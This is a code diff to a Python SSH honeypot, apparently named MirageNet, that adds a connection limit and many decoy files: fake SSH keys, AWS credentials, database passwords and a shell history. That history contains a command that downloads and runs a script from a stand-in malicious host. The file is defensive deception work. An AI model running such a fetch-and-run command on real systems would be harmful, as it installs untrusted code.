@@ -12,7 +12,11 @@ CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
 PROJECT_ROOT = os.path.abspath(os.path.join(CURRENT_DIR, '../../'))
 sys.path.append(PROJECT_ROOT)
 
+from concurrent.futures import ThreadPoolExecutor
 from shared.database import log_attack, get_attempt_count
+
+# GÜVENLİK LİMİTLERİ (Bellek koruması için bağlantı sayısı sınırı)
+MAX_CONNECTIONS = 50
 
 # RSA Key yükleme (Hata almamak için yol sabitlendi)
 HOST_KEY = paramiko.RSAKey(filename=os.path.join(CURRENT_DIR, 'rsa_key'))
@@ -83,25 +87,48 @@ def handle_connection(client_sock, client_addr):
     current_path = "/root"
     command_history = []
     
-    # SAHTE DOSYA SİSTEMİ İÇERİĞİ
+    # SAHTE DOSYA SİSTEMİ İÇERİĞİ (TÜM ESKİ VE YENİ YEMLER)
     vfs = {
+        # --- ESKİ /root DOSYALARI ---
         "/root/backup.sql": "-- MySQL dump 10.13\n-- Host: localhost\n-- Database: miragenet_db\nINSERT INTO `users` VALUES (1,'admin','$2y$10$vI8..');\n",
-        "/root/.bash_history": "ls -la\ncd /etc\ncat passwd\nssh 192.168.1.50\nexit\n",
+        "/root/.bash_history": "ls -la\ncd /etc\ncat passwd\nssh 192.168.1.50\nwget http://evil-malware.com/shell.sh\nchmod +x shell.sh\n./shell.sh\nrm shell.sh\nls -R /var/www\nexit\n",
         "/root/web-app/config.php": "<?php\n$db_user = 'root';\n$db_pass = 'S3cr3t_P@ss!';\n?>\n",
         "/root/web-app/index.php": "<?php echo 'MirageNet Web App is running!'; ?>\n",
+
+        # --- YENİ EKLENEN KRİTİK YEMLER ---
+        "/root/.ssh/id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA75Z5...[FAKE PRIVATE KEY]...75Z5\n-----END RSA PRIVATE KEY-----\n",
+        "/root/.ssh/authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... backup-service\n",
+        "/root/.aws/credentials": "[default]\naws_access_key_id = AKIA_FAKE_ID_2J3K4L5M6N7O8P9\naws_secret_access_key = wJalr_FAKE_SECRET_K7MDENG_bPxRfiCY\n",
+        "/root/docker-compose.yml": "version: '3'\nservices:\n  app:\n    image: node:18\n    ports:\n      - \"3000:3000\"\n  db:\n    image: postgres:15\n    environment:\n      POSTGRES_PASSWORD: prod_password_2024\n",
+        
+        # --- WEB & APP SECRET'LAR ---
+        "/var/www/html/index.php": "<?php echo 'Production Server v2.4.1'; ?>\n",
+        "/var/www/html/.env": "DB_HOST=10.0.5.20\nDB_USER=prod_user\nDB_PASS=P@ssw0rd2024!\nSTRIPE_API_KEY=sk_dummy_4eC39HqLyjWDarjtT1zdp7dc\n",
+        "/var/www/html/config.php": "<?php\n$db_user = 'root';\n$db_pass = 'S3cr3t_P@ss!';\n?>\n",
+        "/var/www/html/.git/config": "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n[remote \"origin\"]\n\turl = https://github.com/miragenet-inc/main-app.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n",
+        
+        # --- SİSTEM DOSYALARI & LOGLAR ---
         "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsshd:x:100:65534::/run/sshd:/usr/sbin/nologin\nmysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false\n",
         "/etc/shadow": "root:$6$v/9A9.zU$r5lU..../:18500:0:99999:7:::\ndaemon:*:18500:0:99999:7:::\nbin:*:18500:0:99999:7:::\n",
         "/etc/os-release": 'PRETTY_NAME="Ubuntu 22.04.3 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"\nID=ubuntu\nID_LIKE=debian\n',
         "/etc/issue": "Ubuntu 22.04.3 LTS \\n \\l\n",
-        "/etc/hostname": "ubuntu\n",
-        "/etc/hosts": "127.0.0.1\tlocalhost\n127.0.1.1\tubuntu\n::1\tlocalhost ip6-localhost ip6-loopback\n",
-        "/proc/meminfo": "MemTotal:        8174548 kB\nMemFree:         4123564 kB\nMemAvailable:    6231456 kB\nBuffers:          210456 kB\nCached:          2345672 kB\nSwapTotal:       2097148 kB\nSwapFree:        2097148 kB\n",
-        "/proc/cpuinfo": "processor\t: 0\nvendor_id\t: GenuineIntel\ncpu family\t: 6\nmodel\t\t: 142\nmodel name\t: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz\nstepping\t: 2\nmicrocode\t: 0x43\ncpu MHz\t\t: 2400.000\ncache size\t: 30720 KB\ncores\t\t: 2\n",
-        "/proc/version": "Linux version 5.15.0-84-generic (buildd@lcy02-amd64-077) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023\n"
+        "/etc/hostname": "prod-web-01\n",
+        "/etc/hosts": "127.0.0.1\tlocalhost\n10.0.5.20\tdb-server\n10.0.5.31\tredis-cache\n",
+        "/var/log/auth.log": f"{datetime.now().strftime('%b %d %H:%M:%S')} ubuntu sshd[1234]: Failed password for root from 185.12.34.56 port 4321 ssh2\n",
+        "/var/log/syslog": f"{datetime.now().strftime('%b %d %H:%M:%S')} ubuntu kernel: [ 12.34] eth0: link up, 1000Mbps, full duplex\n",
+        
+        # --- /proc BİLGİLERİ ---
+        "/proc/meminfo": "MemTotal:        8174548 kB\nMemFree:         4123564 kB\nMemAvailable:    6231456 kB\n",
+        "/proc/cpuinfo": "model name\t: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz\ncpu cores\t: 2\n",
+        "/proc/version": "Linux version 5.15.0-84-generic\n"
     }
 
     # Dinamik dizin seti oluştur
-    directories = {"/", "/root", "/etc", "/var", "/var/log", "/var/www", "/var/www/html", "/home", "/home/admin", "/bin", "/sbin", "/usr", "/usr/bin", "/tmp", "/dev", "/proc", "/sys", "/boot", "/root/web-app"}
+    directories = {
+        "/", "/root", "/root/web-app", "/root/.ssh", "/root/.aws", "/etc", "/var", "/var/log", 
+        "/var/www", "/var/www/html", "/var/www/html/.git", "/home", "/home/admin", 
+        "/bin", "/sbin", "/usr", "/usr/bin", "/tmp", "/dev", "/proc", "/sys", "/boot"
+    }
     
     # Yardımcı Fonksiyonlar
     def clean_path(path):
@@ -430,20 +457,20 @@ def handle_connection(client_sock, client_addr):
 
 def start_server():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    # 1. Önce portun yeniden kullanılabilirliğini ayarla
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
-    # 2. Sonra sadece BİR KEZ bind işlemini yap (Yukarıda PORT = 2222 tanımlı varsayıyorum)
     sock.bind(('0.0.0.0', PORT)) 
-    
-    # 3. Dinlemeye başla
     sock.listen(100)
     print(f"[*] MirageNet SSH Sensor listening on Port: {PORT}")
+    print(f"[*] Connection Limit: {MAX_CONNECTIONS} concurrent sessions")
 
-    while True:
-        client, addr = sock.accept()
-        threading.Thread(target=handle_connection, args=(client, addr)).start()
+    # Thread havuzu kullanarak bellek kullanımını sınırla
+    with ThreadPoolExecutor(max_workers=MAX_CONNECTIONS) as executor:
+        while True:
+            try:
+                client, addr = sock.accept()
+                executor.submit(handle_connection, client, addr)
+            except Exception as e:
+                print(f"[!] SSH Accept Error: {e}")
 
 if __name__ == "__main__":
     start_server()
